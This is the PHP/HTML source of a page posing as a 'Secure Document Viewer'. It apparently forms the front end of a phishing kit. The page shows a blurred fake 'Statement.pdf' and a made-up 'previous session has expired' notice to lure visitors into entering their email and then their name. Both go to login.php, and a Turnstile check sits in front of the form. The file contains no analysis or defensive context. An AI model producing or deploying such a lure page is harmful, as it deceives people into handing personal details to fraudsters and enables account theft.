<?php
session_start();

// Step control
$step = $_SESSION['step'] ?? 1;

// Old email
$old_email = $_SESSION['old_email'] ?? '';

// Error message from backend
$error = $_SESSION['error_message'] ?? '';
unset($_SESSION['error_message']);

// Show the "previous session expired" ONLY on FIRST LOAD
$show_expired_message = !isset($_SESSION['viewed_index']);
$_SESSION['viewed_index'] = true;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Secure Document Viewer</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

<style>
/* -------------------------------------------
   AUTO DARK/LIGHT MODE
-------------------------------------------- */
:root {
    --card-bg: #f5f5f5;
    --text-color: #222;
    --subtext: #666;
    --border: #d0d0d0;
    --btn-bg: #1a73e8;
    --btn-hover: #185abc;
    --error: #c21515;
    --overlay-dark: rgba(0,0,0,0.65);
}

@media (prefers-color-scheme: dark) {
    :root {
        --card-bg: #1b1b1b;
        --text-color: #eee;
        --subtext: #aaa;
        --border: #333;
        --btn-bg: #3478f6;
        --btn-hover: #1f5fcc;
        --overlay-dark: rgba(0,0,0,0.72);
    }
}

/* -------------------------------------------
   PAGE BACKGROUND
-------------------------------------------- */
body {
    margin: 0;
    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    background: #000;
    color: var(--text-color);
}

.page-wrapper {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    overflow: hidden;
}

.doc-background {
    position: absolute;
    inset: 0;
    filter: blur(6px);
    transform: scale(1.05);
    opacity: 0.55;
}

.doc-background img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.page-wrapper::before {
    content: "";
    position: absolute;
    inset: 0;
    background: var(--overlay-dark);
}

/* -------------------------------------------
   CARD
-------------------------------------------- */
.login-card {
    position: relative;
    z-index: 2;
    width: 92%;
    max-width: 330px;
    background: var(--card-bg);
    border-radius: 6px;
    padding: 24px 22px 28px;
    box-shadow: 0 18px 45px rgba(0,0,0,0.45);
}

/* PDF Icon */
.doc-icon {
    width: 44px;
    height: 44px;
    margin: 0 auto 10px;
}

.doc-icon-img {
    width: 100%;
    height: 100%;
    object-fit: contain;
}

/* Titles */
.doc-title {
    text-align: center;
    font-size: 16px;
    font-weight: 600;
    margin-bottom: 4px;
}

.doc-subtitle {
    text-align: center;
    color: var(--subtext);
    font-size: 11px;
    margin-bottom: 12px;
}

/* Error */
.login-error {
    color: var(--error);
    text-align: center;
    font-size: 11px;
    margin-bottom: 12px;
    font-weight: bold;
}

/* Fields */
.field-wrapper {
    margin-bottom: 14px;
}

.field-wrapper input {
    width: 100%;
    padding: 10px 11px;
    border-radius: 4px;
    border: 1px solid var(--border);
    background: transparent;
    color: var(--text-color);
    font-size: 14px;
}

.field-wrapper input:focus {
    border-color: var(--btn-bg);
}

/* Turnstile size */
.cf-turnstile {
    margin-bottom: 14px;
    transform: scale(0.93);
    transform-origin: 0 0;
}

/* Button */
.btn-primary {
    width: 100%;
    padding: 11px;
    background: var(--btn-bg);
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

.btn-primary:hover {
    background: var(--btn-hover);
}
</style>
</head>

<body>
<div class="page-wrapper">

    <div class="doc-background">
        <img src="assets/background.png" alt="Background">
    </div>

    <div class="login-card">

        <div class="doc-icon">
            <img src="assets/PDtrans.png" class="doc-icon-img">
        </div>

        <h2 class="doc-title">Statement.pdf <span class="doc-size">(197 KB)</span></h2>

        <?php if($step == 1 && $show_expired_message): ?>
            <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
        <?php endif; ?>

        <?php if($error): ?>
            <p class="login-error"><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>


        <?php if($step == 1): ?>
        <!-- STEP 1: EMAIL + CAPTCHA -->
        <form method="POST" action="login.php">

            <div class="field-wrapper">
                <input type="email" name="email" value="<?= htmlspecialchars($old_email) ?>"
                       placeholder="Enter your email" required>
            </div>

            <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>

            <button class="btn-primary">Next</button>
        </form>

        <?php else: ?>
        <!-- STEP 2: NAME + SHOW EMAIL -->
        <form method="POST" action="login.php">

            <div class="field-wrapper">
                <input type="email" value="<?= htmlspecialchars($old_email) ?>" readonly>
            </div>

            <div class="field-wrapper">
                <input type="text" name="name" placeholder="Enter your name" required>
            </div>

            <button class="btn-primary">Next</button>
        </form>

        <?php endif; ?>

    </div>
</div>
</body>
</html>
